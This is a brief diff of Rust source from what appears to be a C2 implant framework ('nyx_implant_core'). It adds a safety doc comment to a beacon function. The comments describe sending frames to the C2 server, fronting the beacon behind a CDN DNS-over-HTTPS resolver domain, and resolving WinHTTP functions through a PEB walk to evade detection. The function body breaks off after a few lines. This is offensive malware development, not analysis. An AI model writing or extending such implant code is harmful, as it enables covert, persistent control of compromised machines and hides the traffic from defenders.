@@ -22,6 +22,10 @@ use nyx_implant_core::heap::Vec;
 /// Delegates to `transport::post_frame()`. The host is `ctx.doh_resolver`
 /// when set, otherwise `ctx.server_host` — so an operator can front the DNS
 /// beacon behind a CDN resolver domain while keeping the same C2 port/TLS.
+///
+/// # Safety
+/// Delegates to `transport::post_frame`, which invokes WinHTTP function
+/// pointers resolved via PEB walk; `frame` must be a valid buffer.
 pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
     let host: &[u8] = if !ctx.doh_resolver.is_empty() {
         ctx.doh_resolver.as_bytes()
